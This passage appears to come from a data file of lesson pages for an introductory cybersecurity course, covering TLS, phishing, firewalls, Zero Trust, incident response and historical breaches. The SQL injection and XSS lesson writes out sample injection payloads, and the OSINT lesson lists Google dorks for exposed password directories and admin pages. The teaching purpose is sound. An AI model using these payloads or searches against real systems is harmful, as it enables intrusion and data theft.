<p><strong>In practice:</strong> Both are used together. Asymmetric encrypts a symmetric key. Then symmetric encrypts the data. This is called a <strong>hybrid system</strong>.</p>`
      },
      {
        titleEn: "The TLS Handshake",
        contentEn: `<p><strong>TLS</strong> (Transport Layer Security) protects data between your browser and the server. The padlock icon in your browser = TLS is active.</p>

<p><strong>TLS Handshake steps:</strong></p>

<pre><code>Browser                          Server
<table>
<thead><tr></tr></thead>
<tbody>
<tr><td></td></tr>
<tr><td><-- 2. ServerHello ------------</td><td>(chosen cipher, server certificate)</td></tr>
<tr><td></td></tr>
<tr><td>3. Browser verifies</td><td>(is certificate valid? trusted CA?)</td></tr>
<tr><td>server certificate</td></tr>
<tr><td></td></tr>
<tr><td>--- 4. Key Exchange ----------></td><td>(both sides compute shared secret)</td></tr>
<tr><td></td></tr>
<tr><td><== 5. Encrypted tunnel ======></td><td>(all data encrypted with shared key)</td></tr>
</tbody></table>
</code></pre>

<p><strong>Key concepts:</strong></p>
<ul>
<li><strong>Certificate</strong> — proves the server is who it says it is (signed by a CA)</li>
<li><strong>CA (Certificate Authority)</strong> — trusted organizations that issue certificates (Let's Encrypt, DigiCert)</li>
<li><strong>Cipher suite</strong> — the combination of algorithms used (e.g., TLS_AES_256_GCM_SHA384)</li>
</ul>

<p><strong>TLS versions:</strong></p>
<ul>
<li>TLS 1.0, 1.1 — deprecated, insecure</li>
<li><strong>TLS 1.2</strong> — still widely used, secure</li>
<li><strong>TLS 1.3</strong> — latest, faster handshake (1 round trip instead of 2)</li>
</ul>`
      },
      {
        titleEn: "WhatsApp End-to-End Encryption",
        contentEn: `<p><strong>End-to-End Encryption (E2E)</strong> = only the sender and receiver can read the messages. Not even the service provider (WhatsApp/Signal) can read them.</p>

<p><strong>How WhatsApp E2E works (Signal Protocol):</strong></p>

<ol>
<li><strong>Key generation</strong> — each phone creates a key pair (public + private)</li>
<li><strong>Key exchange</strong> — phones exchange public keys when you start a chat</li>
<li><strong>Message encryption</strong> — each message is encrypted with a unique key</li>
<li><strong>Forward secrecy</strong> — even if one key is stolen, past messages stay safe</li>
</ol>

<p><strong>What WhatsApp CAN see:</strong></p>
<ul>
<li>Who you talk to (metadata)</li>
<li>When you send messages (timestamps)</li>
<li>Your phone number and contacts</li>
</ul>

<p><strong>What WhatsApp CANNOT see:</strong></p>
<ul>
<li>Message content (text, photos, videos)</li>
<li>Voice and video call content</li>
</ul>

<p><strong>Why metadata matters:</strong></p>
<ul>
<li>"You called a suicide hotline at 2 AM for 45 minutes" — no content needed to learn a lot</li>
<li>Governments have requested metadata from WhatsApp</li>
</ul>

<p><strong>Comparison:</strong></p>
<ul>
<li><strong>WhatsApp</strong> — E2E by default, closed source</li>
<li><strong>Signal</strong> — E2E by default, open source, minimal metadata</li>
<li><strong>Telegram</strong> — E2E only in "Secret Chats" (not default!)</li>
</ul>`
      },
      {
        titleEn: "Story: The Heartbleed Bug",
        contentEn: `<p>In April 2014, researchers discovered <strong>Heartbleed</strong> — a bug in OpenSSL that affected <strong>17% of all web servers</strong>.</p>

<p><strong>What is OpenSSL?</strong></p>
<ul>
<li>The most popular library for TLS/SSL encryption</li>
<li>Used by millions of websites, email servers, VPNs</li>
</ul>

<p><strong>The bug (CVE-2014-0160):</strong></p>
<ul>
<li>TLS has a "heartbeat" feature — a keep-alive ping between client and server</li>
<li>Client sends: "Here is a 4-byte word: 'bird'. Send it back."</li>
<li>Server reads 4 bytes and sends back: "bird" ✓</li>
</ul>

<p><strong>The exploit:</strong></p>
<ul>
<li>Attacker sends: "Here is a 40,000-byte word: 'bird'. Send it back."</li>
<li>Server doesn't check the real length</li>
<li>Server reads 40,000 bytes from memory and sends them back</li>
<li>Those bytes contain: <strong>private keys, passwords, session tokens</strong></li>
</ul>

<p><strong>Impact:</strong></p>
<ul>
<li>Attacker could steal the server's <strong>private SSL key</strong></li>
<li>With the key → decrypt all traffic (past and future)</li>
<li>No trace in server logs — completely invisible</li>
</ul>

<p><strong>The fix:</strong></p>
<ul>
<li>Add one line of code: check that the claimed length matches the actual length</li>
<li>The bug existed for <strong>2 years</strong> before discovery (introduced in 2012)</li>
</ul>

<p><strong>Lesson:</strong> One small coding mistake in a critical library can break the security of half the internet.</p>`
      }
    ]
  },

  108: {
    titleEn: "Social Engineering Attacks",
    pages: [
      {
        titleEn: "Anatomy of a Phishing Attack",
        contentEn: `<p><strong>Phishing</strong> = tricking people into giving up passwords, clicking malicious links, or downloading malware.</p>

<p><strong>Phishing email red flags:</strong></p>
<ul>
<li>Urgent language: "Your account will be closed in 24 hours!"</li>
<li>Generic greeting: "Dear Customer" (not your name)</li>
<li>Suspicious sender: support@amaz0n-security.com (not amazon.com)</li>
<li>Mismatched link: text says "amazon.com" but link goes to "amaz0n.evil.com"</li>
<li>Unexpected attachment: "Invoice_March.pdf.exe"</li>
</ul>

<p><strong>Types of phishing:</strong></p>
<ul>
<li><strong>Mass phishing</strong> — same email to millions of people</li>
<li><strong>Spear phishing</strong> — targeted at a specific person (uses personal details)</li>
<li><strong>Whaling</strong> — spear phishing aimed at executives (CEO, CFO)</li>
<li><strong>Clone phishing</strong> — copies a real email you received, replaces the attachment</li>
</ul>

<p><strong>How to check a suspicious email:</strong></p>
<ol>
<li>Hover over links — check the real URL before clicking</li>
<li>Check the sender's actual email address (not just the display name)</li>
<li>Look for spelling and grammar mistakes</li>
<li>Ask yourself: "Did I expect this email?"</li>
<li>When in doubt — go directly to the website (don't click the link)</li>
</ol>`
      },
      {
        titleEn: "Vishing, Smishing & Pretexting",
        contentEn: `<p><strong>Vishing</strong> (Voice Phishing) — attacks over the phone:</p>
<ul>
<li>Caller pretends to be your bank, IT support, or government</li>
<li>Uses caller ID spoofing (shows a real bank number)</li>
<li>Creates urgency: "Suspicious transaction on your account right now!"</li>
<li>Goal: get your password, OTP code, or credit card number</li>
</ul>

<p><strong>Smishing</strong> (SMS Phishing) — attacks via text message:</p>
<ul>
<li>"Your package is waiting. Track here: bit.ly/susp1c10us"</li>
<li>"Bank alert: unusual login. Verify: [link]"</li>
<li>Short links hide the real destination</li>
<li>Works because people trust SMS more than email</li>
</ul>

<p><strong>Pretexting</strong> — creating a fake scenario to build trust:</p>
<ul>
<li>Attacker calls IT help desk: "Hi, I'm John from the marketing team. I forgot my password and I have a presentation in 10 minutes. Can you reset it?"</li>
<li>Attacker poses as a fire inspector to walk through the building</li>
<li>Uses authority, urgency, or sympathy to bypass security</li>
</ul>

<p><strong>Why social engineering works:</strong></p>
<ul>
<li>Humans are the weakest link in security</li>
<li>People want to be helpful</li>
<li>Urgency bypasses critical thinking</li>
<li>Authority makes people comply without questioning</li>
</ul>`
      },
      {
        titleEn: "Story: The Twitter Hack (2020)",
        contentEn: `<p>On July 15, 2020, high-profile Twitter accounts were hijacked — including <strong>Barack Obama, Elon Musk, Bill Gates, and Apple</strong>.</p>

<p><strong>The tweets:</strong> "I'm giving back! Send $1,000 in Bitcoin and I'll send you $2,000 back." All tweets linked to the same Bitcoin wallet.</p>

<p><strong>How it happened:</strong></p>
<ol>
<li>A 17-year-old from Florida called Twitter employees</li>
<li>He pretended to be from Twitter's IT department</li>
<li>He convinced employees to enter their credentials on a fake internal tool page (<strong>vishing + phishing</strong>)</li>
<li>With employee access, he used Twitter's internal admin panel</li>
<li>He took over 130 accounts, tweeted from 45 of them</li>
</ol>

<p><strong>Result:</strong></p>
<ul>
<li>$120,000 stolen in Bitcoin within hours</li>
<li>Twitter stock dropped 4%</li>
<li>Twitter had to disable tweeting for all verified accounts temporarily</li>
</ul>

<p><strong>The arrest:</strong></p>
<ul>
<li>FBI tracked the Bitcoin transactions</li>
<li>The 17-year-old was arrested 2 weeks later</li>
<li>Sentenced to 3 years in juvenile detention</li>
</ul>

<p><strong>Lessons:</strong></p>
<ul>
<li>Internal tools need strong access controls (MFA, audit logs)</li>
<li>Even big tech companies are vulnerable to social engineering</li>
<li>Security awareness training is essential for all employees</li>
<li>A teenager with no technical exploit — just social skills — took over Twitter</li>
</ul>`
      },
      {
        titleEn: "Defense Against Social Engineering",
        contentEn: `<p><strong>For individuals:</strong></p>
<ul>
<li>Enable <strong>MFA</strong> (Multi-Factor Authentication) everywhere</li>
<li>Use a <strong>password manager</strong> (unique passwords for every site)</li>
<li>Never share passwords, OTP codes, or personal info over phone/email</li>
<li>Verify requests through a different channel (call back on official number)</li>
<li>If it feels urgent — slow down and think</li>
</ul>

<p><strong>For organizations:</strong></p>

<p><strong>Security Awareness Training:</strong></p>
<ul>
<li>Regular phishing simulations (monthly)</li>
<li>Train employees to report suspicious emails (reward reporting)</li>
<li>Special training for high-risk roles (finance, HR, executives)</li>
</ul>

<p><strong>Technical controls:</strong></p>
<ul>
<li>Email filtering and anti-phishing gateways</li>
<li>DMARC/SPF/DKIM — prevent email spoofing</li>
<li>MFA for all internal tools (especially admin panels)</li>
<li>Principle of least privilege — limit access to what's needed</li>
</ul>

<p><strong>Processes:</strong></p>
<ul>
<li>Verify identity before password resets (callback procedure)</li>
<li>Two-person approval for financial transfers over threshold</li>
<li>Visitor badges and escort policy for physical access</li>
<li>Incident reporting hotline (make it easy to report)</li>
</ul>

<p><strong>Key metric:</strong> Click rate on phishing simulations. Good companies aim for <5%. Average is 20-30%.</p>`
      }
    ]
  },

  109: {
    titleEn: "Firewalls, Zero Trust & Network Defense",
    pages: [
      {
        titleEn: "Firewall Types",
        contentEn: `<p><strong>Firewall</strong> = a security device that controls network traffic based on rules. It decides what goes in and what goes out.</p>

<p><strong>1. Stateless (Packet Filter)</strong></p>
<ul>
<li>Checks each packet individually against simple rules</li>
<li>Rules based on: source IP, destination IP, port, protocol</li>
<li>Fast but dumb — doesn't understand connections</li>
<li>Example rule: "Block all traffic from IP 10.0.0.5 to port 22"</li>
</ul>

<p><strong>2. Stateful</strong></p>
<ul>
<li>Tracks the <strong>state</strong> of connections (new, established, related)</li>
<li>If you start a connection outbound, it allows the response back in</li>
<li>Smarter — can detect packets that don't belong to a real connection</li>
<li>Most traditional firewalls are stateful</li>
</ul>

<p><strong>3. NGFW (Next-Generation Firewall)</strong></p>
<ul>
<li>Everything stateful does, plus:</li>
<li><strong>Application awareness</strong> — can identify apps (YouTube, Slack, BitTorrent) regardless of port</li>
<li><strong>IPS</strong> (Intrusion Prevention) — blocks known attack patterns</li>
<li><strong>SSL inspection</strong> — decrypts and inspects HTTPS traffic</li>
<li><strong>User identity</strong> — rules based on user/group, not just IP</li>
<li>Examples: Palo Alto, Fortinet, Check Point</li>
</ul>

<p><strong>Where firewalls sit:</strong></p>
<ul>
<li>Between internet and your network (perimeter)</li>
<li>Between network segments (internal)</li>
<li>On each computer (host-based: Windows Firewall, iptables)</li>
</ul>`
      },
      {
        titleEn: "DMZ Architecture",
        contentEn: `<p><strong>DMZ</strong> (Demilitarized Zone) = a network segment between the public internet and your private network.</p>

<p><strong>Architecture diagram:</strong></p>

<pre><code>Internet
<p>|</p>
<p>[Outer Firewall]     ← allows HTTP/HTTPS from internet</p>
<p>|</p>
<p>[DMZ]              ← web servers, email servers, DNS</p>
<p>|</p>
<p>[Inner Firewall]     ← strict rules, limited access</p>
<p>|</p>
<p>[Internal Network]   ← databases, file servers, workstations</p>
</code></pre>

<p><strong>Rules:</strong></p>
<ul>
<li>Internet → DMZ: allowed (specific ports only: 80, 443)</li>
<li>DMZ → Internal: very limited (e.g., web server → database on port 3306 only)</li>
<li>Internal → DMZ: allowed (for management)</li>
<li>Internet → Internal: <strong>blocked</strong> (never direct access)</li>
</ul>

<p><strong>What goes in the DMZ:</strong></p>
<ul>
<li>Web servers (public-facing)</li>
<li>Email servers (MX records)</li>
<li>DNS servers (public)</li>
<li>VPN gateways</li>
<li>Reverse proxies / load balancers</li>
</ul>

<p><strong>Why DMZ matters:</strong></p>
<ul>
<li>If a web server is hacked, the attacker is stuck in the DMZ</li>
<li>The inner firewall prevents access to the real data</li>
<li>Without DMZ: hacked web server = direct access to database</li>
</ul>`
      },
      {},
      {
        titleEn: "Zero Trust (ZTNA)",
        contentEn: `<p><strong>Zero Trust</strong> = "Never trust, always verify." No user or device is trusted by default — even if they are inside the network.</p>

<p><strong>Traditional model (castle and moat):</strong></p>
<ul>
<li>Firewall protects the perimeter</li>
<li>Once inside, you can access everything</li>
<li>Problem: if attacker gets in, they move freely (lateral movement)</li>
</ul>

<p><strong>Zero Trust principles:</strong></p>
<ol>
<li><strong>Verify explicitly</strong> — authenticate and authorize every request</li>
<li><strong>Least privilege</strong> — give minimum access needed, for minimum time</li>
<li><strong>Assume breach</strong> — design as if attackers are already inside</li>
</ol>

<p><strong>How Zero Trust works:</strong></p>
<ul>
<li><strong>Identity</strong> — strong authentication (MFA) for every access</li>
<li><strong>Device</strong> — check device health (updated? encrypted? managed?)</li>
<li><strong>Network</strong> — micro-segmentation (each app is isolated)</li>
<li><strong>Application</strong> — per-app access (not full network VPN)</li>
<li><strong>Data</strong> — classify and encrypt sensitive data</li>
<li><strong>Monitoring</strong> — continuous verification, not just at login</li>
</ul>

<p><strong>Real-world example:</strong></p>
<ul>
<li>Old way: VPN → access entire corporate network</li>
<li>Zero Trust: authenticate → verify device → access only the specific app you need → re-verify continuously</li>
</ul>

<p><strong>Key technologies:</strong> Identity Provider (Azure AD/Okta), MFA, micro-segmentation, ZTNA proxies (Zscaler, Cloudflare Access)</p>`
      },
      {
        titleEn: "Story: Stuxnet — The First Cyber Weapon",
        contentEn: `<p>In 2010, researchers discovered <strong>Stuxnet</strong> — a computer worm designed to physically destroy Iran's nuclear centrifuges.</p>

<p><strong>What Stuxnet did:</strong></p>
<ul>
<li>Targeted Siemens SCADA systems controlling uranium enrichment centrifuges</li>
<li>Changed the speed of centrifuges (too fast, then too slow)</li>
<li>While displaying <strong>normal readings</strong> to the operators</li>
<li>Destroyed approximately <strong>1,000 centrifuges</strong> at Natanz facility</li>
</ul>

<p><strong>How it spread:</strong></p>
<ul>
<li>Via <strong>USB drives</strong> (the facility was air-gapped — not connected to internet)</li>
<li>Used <strong>4 zero-day exploits</strong> (unknown vulnerabilities) — extremely rare</li>
<li>Only activated on systems with specific Siemens software + specific configuration</li>
<li>Infected 200,000+ computers worldwide but only damaged the target</li>
</ul>

<p><strong>Why it's historic:</strong></p>
<ul>
<li>First known <strong>cyberweapon</strong> designed to cause physical damage</li>
<li>Attributed to USA and Israel (never officially confirmed)</li>
<li>Changed warfare — showed that code can destroy physical infrastructure</li>
<li>Led to the creation of US Cyber Command</li>
</ul>

<p><strong>Defense lessons:</strong></p>
<ul>
<li>Air gaps are not enough (USB drives bypass them)</li>
<li>Industrial control systems (ICS/SCADA) need security updates</li>
<li>Supply chain attacks are real — inspect everything entering secure facilities</li>
<li>Monitor for unusual behavior, not just known malware signatures</li>
</ul>`
      }
    ]
  },

  110: {
    titleEn: "SQL Injection & XSS Deep Dive",
    pages: [
      {
        titleEn: "SQL Injection Techniques",
        contentEn: `<p><strong>Beyond basic SQLi — advanced techniques attackers use:</strong></p>

<p><strong>1. UNION-based SQLi</strong></p>
<ul>
<li>Combines results from two queries:</li>
</ul>
<pre><code>sql
<p>' UNION SELECT username, password FROM users --</p>
</code></pre>
<ul>
<li>Attacker must match the number of columns in the original query</li>
<li>Used to extract data from other tables</li>
</ul>

<p><strong>2. Blind SQLi (Boolean-based)</strong></p>
<ul>
<li>The page doesn't show query results, but behaves differently for true/false</li>
</ul>
<pre><code>sql
<p>' AND 1=1 --   (page loads normally → true)</p>
<p>' AND 1=2 --   (page shows error → false)</p>
</code></pre>
<ul>
<li>Attacker asks yes/no questions to extract data one bit at a time</li>
<li>Example: "Is the first character of the admin password 'a'?"</li>
</ul>

<p><strong>3. Time-based Blind SQLi</strong></p>
<ul>
<li>No visible difference in response. Attacker uses delays:</li>
</ul>
<pre><code>sql
<p>' AND IF(1=1, SLEEP(5), 0) --</p>
</code></pre>
<ul>
<li>If response takes 5 seconds → condition is true</li>
<li>Very slow but works when nothing else does</li>
</ul>

<p><strong>Defenses (recap):</strong></p>
<ul>
<li>Parameterized queries / prepared statements — always #1</li>
<li>ORM (Object-Relational Mapping) — abstracts SQL away</li>
<li>Input validation + WAF as extra layers</li>
<li>Regular security testing (SQLMap, Burp Scanner)</li>
</ul>`
      },
      {
        titleEn: "XSS Deep Dive",
        contentEn: `<p><strong>Three types of XSS in detail:</strong></p>

<p><strong>1. Stored XSS (Persistent)</strong></p>
<ul>
<li>Malicious script is saved in the database</li>
<li>Every user who views the page executes the script</li>
<li>Most dangerous — affects many users automatically</li>
<li>Example: attacker posts a comment containing <code><script>...\</script></code></li>
</ul>

<p><strong>2. Reflected XSS (Non-persistent)</strong></p>
<ul>
<li>Script is part of the URL/request</li>
<li>Server includes the input in the response without sanitizing</li>
<li>Attacker must trick the victim into clicking a crafted link</li>
<li>Example: <code>search.php?q=<script>alert(1)</script></code></li>
</ul>

<p><strong>3. DOM-based XSS</strong></p>
<ul>
<li>The vulnerability is in <strong>client-side JavaScript</strong>, not the server</li>
<li>The server never sees the malicious input</li>
<li>Example: JavaScript reads from <code>location.hash</code> and writes to <code>innerHTML</code></li>
</ul>
<pre><code>javascript
<p>// Vulnerable code</p>
<p>document.getElementById('output').innerHTML = location.hash.slice(1);</p>
<p>// Attack URL: page.html#<img src=x onerror=alert(1)></p>
</code></pre>

<p><strong>XSS impact:</strong></p>
<ul>
<li>Steal session cookies → account takeover</li>
<li>Redirect users to phishing pages</li>
<li>Capture keystrokes (keylogger)</li>
<li>Deface the website</li>
</ul>

<p><strong>Defenses:</strong></p>
<ul>
<li>Output encoding (HTML entities, JavaScript encoding)</li>
<li>Content Security Policy (CSP) header</li>
<li>Use frameworks that auto-escape (React, Angular)</li>
<li><code>HttpOnly</code> flag on cookies (prevents JavaScript access)</li>
</ul>`
      }
    ]
  },

  111: {
    titleEn: "Authentication & Authorization",
    pages: [
      {
        titleEn: "Authentication vs Authorization",
        contentEn: `<p><strong>Authentication (AuthN)</strong> = verifying <strong>who you are</strong></p>
<p><strong>Authorization (AuthZ)</strong> = verifying <strong>what you can do</strong></p>

<p><strong>Example:</strong></p>
<ul>
<li>You show your ID at the door → Authentication</li>
<li>The guard checks if you can enter the VIP room → Authorization</li>
</ul>

<p><strong>Authentication factors:</strong></p>
<ul>
<li><strong>Something you know</strong> — password, PIN</li>
<li><strong>Something you have</strong> — phone (OTP), security key (YubiKey)</li>
<li><strong>Something you are</strong> — fingerprint, face scan</li>
</ul>

<p><strong>MFA (Multi-Factor Authentication):</strong></p>
<ul>
<li>Uses 2+ factors from different categories</li>
<li>Password + SMS code = MFA (know + have)</li>
<li>Password + security question = NOT MFA (both are "know")</li>
</ul>

<p><strong>Common authentication methods:</strong></p>
<ul>
<li><strong>Session-based</strong> — server stores session, sends cookie to browser</li>
<li><strong>Token-based (JWT)</strong> — server sends signed token, client includes it in every request</li>
<li><strong>OAuth 2.0</strong> — "Login with Google/GitHub" — delegated authorization</li>
<li><strong>SSO</strong> — one login for multiple apps (Azure AD, Okta)</li>
</ul>

<p><strong>Common mistakes:</strong></p>
<ul>
<li>Storing passwords in plain text (use hashing!)</li>
<li>No account lockout after failed attempts</li>
<li>Session tokens that never expire</li>
<li>No MFA on admin accounts</li>
</ul>`
      },
      {
        titleEn: "Password Hashing",
        contentEn: `<p><strong>Never store passwords in plain text.</strong> Use hashing.</p>

<p><strong>Hashing</strong> = one-way function that turns a password into a fixed-length string.</p>
<pre><code>"mypassword" → hash() → "5f4dcc3b5aa765d61d8327deb882cf99"
</code></pre>
<p>You cannot reverse a hash back to the original password.</p>

<p><strong>Why plain hashing is not enough:</strong></p>
<ul>
<li><strong>Rainbow tables</strong> — precomputed hashes for millions of common passwords</li>
<li>If two users have the same password → same hash → attacker knows</li>
</ul>

<p><strong>Salt</strong> = random value added to each password before hashing:</p>
<pre><code>"mypassword" + "x7Kp9" → hash() → "a1b2c3..."  (user 1)
<p>"mypassword" + "Qm3rZ" → hash() → "d4e5f6..."  (user 2)</p>
</code></pre>
<p>Same password, different salt → different hash. Rainbow tables become useless.</p>

<p><strong>Recommended algorithms:</strong></p>
<ul>
<li><strong>bcrypt</strong> — most widely used, has built-in salt, adjustable cost factor</li>
<li><strong>Argon2</strong> — newest, winner of Password Hashing Competition (2015), memory-hard (resists GPU attacks)</li>
<li><strong>scrypt</strong> — memory-hard alternative to bcrypt</li>
</ul>

<p><strong>Do NOT use:</strong> MD5, SHA-1, SHA-256 for passwords (too fast → easy to brute force)</p>`
      }
    ]
  },

  112: {
    titleEn: "HTTP Security Headers & CSRF Defense",
    pages: [
      {
        titleEn: "HTTP Security Headers",
        contentEn: `<p><strong>Security headers</strong> are HTTP response headers that tell the browser how to behave securely.</p>

<p><strong>Content-Security-Policy (CSP):</strong></p>
<ul>
<li>Controls which resources (scripts, styles, images) can load</li>
<li>Prevents XSS by blocking inline scripts</li>
</ul>
<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
</code></pre>
<ul>
<li>Only scripts from your domain and cdn.example.com will run</li>
</ul>

<p><strong>Strict-Transport-Security (HSTS):</strong></p>
<ul>
<li>Forces HTTPS — browser will never use HTTP for this domain</li>
</ul>
<pre><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
</code></pre>
<ul>
<li>Prevents SSL stripping attacks (MITM downgrades HTTPS to HTTP)</li>
</ul>

<p><strong>X-Frame-Options:</strong></p>
<ul>
<li>Prevents your page from being loaded in an iframe</li>
</ul>
<pre><code>X-Frame-Options: DENY
</code></pre>
<ul>
<li>Defends against <strong>clickjacking</strong> (invisible iframe over a real page)</li>
</ul>

<p><strong>Other important headers:</strong></p>
<ul>
<li><strong>X-Content-Type-Options: nosniff</strong> — prevents MIME type sniffing</li>
<li><strong>Referrer-Policy: strict-origin</strong> — controls what URL info is sent to other sites</li>
<li><strong>Permissions-Policy</strong> — disables browser features (camera, microphone, geolocation)</li>
</ul>

<p><strong>Check your headers:</strong> Use securityheaders.com to scan your site (grade A-F)</p>`
      },
      {
        titleEn: "CSRF Tokens & SameSite Cookies",
        contentEn: `<p><strong>CSRF (Cross-Site Request Forgery)</strong> — the browser sends your cookies automatically, even from a malicious site.</p>

<p><strong>Defense 1: CSRF Tokens</strong></p>
<ul>
<li>Server generates a random token for each session/form</li>
<li>Token is included in every form as a hidden field</li>
</ul>
<pre><code>html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3d4e5">
  <input name="amount" value="100">
  <button>Transfer</button>
</form>
</code></pre>
<ul>
<li>Server checks: does the token match? If not → reject</li>
<li>Attacker cannot guess the token → attack fails</li>
</ul>

<p><strong>Defense 2: SameSite Cookies</strong></p>
<ul>
<li>Cookie attribute that controls when cookies are sent cross-site</li>
</ul>
<pre><code>Set-Cookie: session=abc123; SameSite=Strict
</code></pre>

<p><strong>SameSite values:</strong></p>
<ul>
<li><strong>Strict</strong> — cookie is never sent cross-site (safest, but breaks some links)</li>
<li><strong>Lax</strong> — cookie sent on top-level navigation (GET only), not on POST/forms from other sites. <strong>Default in modern browsers.</strong></li>
<li><strong>None</strong> — cookie always sent (must use Secure flag with HTTPS)</li>
</ul>

<p><strong>Defense 3: Check Origin/Referer headers</strong></p>
<ul>
<li>Server checks where the request came from</li>
<li>If origin doesn't match your domain → reject</li>
</ul>

<p><strong>Best practice:</strong> Use CSRF tokens + SameSite=Lax + check Origin header. Defense in depth.</p>`
      }
    ]
  },

  113: {
    titleEn: "Threat Intelligence & OSINT",
    pages: [
      {
        titleEn: "Threat Intelligence Levels",
        contentEn: `<p><strong>Threat Intelligence</strong> = information about threats that helps you make security decisions.</p>

<p><strong>Three levels:</strong></p>

<p><strong>1. Tactical (Technical)</strong></p>
<ul>
<li>IOCs (Indicators of Compromise): malicious IPs, domains, file hashes</li>
<li>Used by: SOC analysts, SIEM rules, firewall blocks</li>
<li>Lifespan: hours to days (attackers change infrastructure often)</li>
<li>Example: "Block IP 203.0.113.42 — it's a C2 server for Cobalt Strike"</li>
</ul>

<p><strong>2. Operational</strong></p>
<ul>
<li>TTPs (Tactics, Techniques, and Procedures) — how attackers operate</li>
<li>Used by: incident responders, threat hunters</li>
<li>Lifespan: months (attackers reuse methods)</li>
<li>Frameworks: <strong>MITRE ATT&CK</strong> — maps all known attacker techniques</li>
<li>Example: "APT29 uses spear phishing with OAuth tokens to access cloud email"</li>
</ul>

<p><strong>3. Strategic</strong></p>
<ul>
<li>High-level trends, geopolitical context, risk assessment</li>
<li>Used by: CISO, board of directors, executives</li>
<li>Lifespan: months to years</li>
<li>Example: "Ransomware attacks on healthcare increased 94% this year. Budget for backup infrastructure."</li>
</ul>

<p><strong>Threat Intelligence sources:</strong></p>
<ul>
<li><strong>Open source (OSINT)</strong> — free: VirusTotal, AlienVault OTX, MITRE ATT&CK</li>
<li><strong>Commercial</strong> — paid feeds: Recorded Future, Mandiant, CrowdStrike</li>
<li><strong>Government</strong> — CISA alerts, FBI flash reports</li>
<li><strong>ISACs</strong> — industry-specific sharing (Financial ISAC, Health ISAC)</li>
</ul>`
      },
      {
        titleEn: "OSINT Tools & Techniques",
        contentEn: `<p><strong>OSINT</strong> (Open Source Intelligence) = gathering information from publicly available sources.</p>

<p><strong>Key tools:</strong></p>

<p><strong>Shodan</strong> — "Search engine for the Internet of Things"</p>
<ul>
<li>Finds internet-connected devices: webcams, servers, routers, SCADA</li>
<li>Search: <code>port:3389 country:US</code> → find open Remote Desktop servers in the US</li>
<li>Useful for: finding exposed services your organization didn't know about</li>
</ul>

<p><strong>Censys</strong> — similar to Shodan, focused on certificates and web services</p>
<ul>
<li>Search by SSL certificate details, HTTP response headers</li>
<li>Find all servers using a specific certificate or technology</li>
</ul>

<p><strong>WHOIS / DNS tools</strong></p>
<ul>
<li><code>whois example.com</code> — who registered the domain? When? Contact info?</li>
<li><code>dig example.com</code> — DNS records (A, MX, NS, TXT)</li>
<li><strong>SecurityTrails</strong> — historical DNS data (what did this domain point to last year?)</li>
</ul>

<p><strong>Google Dorking</strong> — advanced Google searches to find sensitive info:</p>
<ul>
<li><code>site:example.com filetype:pdf</code> — find PDFs on a domain</li>
<li><code>intitle:"index of" password</code> — find exposed directories</li>
<li><code>inurl:admin login</code> — find admin login pages</li>
</ul>

<p><strong>Other OSINT tools:</strong></p>
<ul>
<li><strong>theHarvester</strong> — collect emails, subdomains, IPs from public sources</li>
<li><strong>Maltego</strong> — visual link analysis (connects people, domains, IPs)</li>
<li><strong>Recon-ng</strong> — modular recon framework (like Metasploit for OSINT)</li>
<li><strong>Have I Been Pwned</strong> — check if your email/password was leaked</li>
</ul>

<p><strong>Ethics:</strong> OSINT is legal (public data) but use it responsibly. Don't access systems you find — just report.</p>`
      }
    ]
  },

  114: {
    titleEn: "Incident Response",
    pages: [
      {
        titleEn: "The 6 Phases of Incident Response (NIST)",
        contentEn: `<p>When a security incident happens, you need a structured response. NIST defines 6 phases:</p>

<p><strong>1. Preparation</strong></p>
<ul>
<li>Build an IR team with clear roles</li>
<li>Write playbooks for common incidents (ransomware, data breach, DDoS)</li>
<li>Set up tools: SIEM, forensic workstations, communication channels</li>
<li>Run tabletop exercises (simulate incidents)</li>
</ul>

<p><strong>2. Identification</strong></p>
<ul>
<li>Detect and confirm the incident</li>
<li>Sources: SIEM alerts, user reports, threat intelligence, anomaly detection</li>
<li>Key questions: What happened? When? What systems are affected? Is it ongoing?</li>
<li>Document everything with timestamps</li>
</ul>

<p><strong>3. Containment</strong></p>
<ul>
<li><strong>Short-term:</strong> isolate affected systems (disconnect from network, disable accounts)</li>
<li><strong>Long-term:</strong> apply temporary fixes while preparing for eradication</li>
<li>Preserve evidence (disk images, memory dumps, logs) before making changes</li>
</ul>

<p><strong>4. Eradication</strong></p>
<ul>
<li>Remove the threat completely (malware, backdoors, compromised accounts)</li>
<li>Patch the vulnerability that was exploited</li>
<li>Reset all potentially compromised credentials</li>
</ul>

<p><strong>5. Recovery</strong></p>
<ul>
<li>Restore systems from clean backups</li>
<li>Rebuild compromised systems from scratch (don't trust cleaned systems)</li>
<li>Monitor closely for signs of re-infection</li>
<li>Gradually bring systems back online</li>
</ul>

<p><strong>6. Lessons Learned</strong></p>
<ul>
<li>Hold a post-incident review within 1-2 weeks</li>
<li>What went well? What went wrong? What do we improve?</li>
<li>Update playbooks, detection rules, and security controls</li>
<li>Share findings with the team (and industry if appropriate)</li>
</ul>`
      },
      {
        titleEn: "Story: SolarWinds Supply Chain Attack (2020)",
        contentEn: `<p>In December 2020, the cybersecurity firm FireEye discovered one of the most sophisticated attacks in history.</p>

<p><strong>What happened:</strong></p>
<ul>
<li>Hackers compromised <strong>SolarWinds Orion</strong> — a network monitoring tool used by 33,000+ organizations</li>
<li>They inserted a backdoor (called <strong>SUNBURST</strong>) into a legitimate software update</li>
<li>The infected update was signed with SolarWinds' real certificate</li>
<li>18,000 organizations installed the update — including the US government</li>
</ul>

<p><strong>Who was affected:</strong></p>
<ul>
<li>US Treasury, Commerce, Homeland Security departments</li>
<li>Microsoft, Intel, Cisco, Deloitte</li>
<li>FireEye (who discovered the attack while investigating their own breach)</li>
</ul>

<p><strong>How it worked:</strong></p>
<ol>
<li>Attackers accessed SolarWinds' build system (where software is compiled)</li>
<li>Added malicious code to the Orion update (version 2019.4 - 2020.2.1)</li>
<li>The backdoor waited 2 weeks after install before activating (to avoid detection)</li>
<li>It communicated with C2 servers using DNS requests that looked like normal Orion traffic</li>
<li>Attackers selected high-value targets and moved deeper into their networks</li>
</ol>

<p><strong>Attribution:</strong> Russian intelligence (SVR) — group known as APT29 / Cozy Bear</p>

<p><strong>Impact:</strong></p>
<ul>
<li>Estimated cost: $100 billion+</li>
<li>Led to a US Executive Order on improving national cybersecurity</li>
<li>Changed how organizations think about supply chain security</li>
</ul>

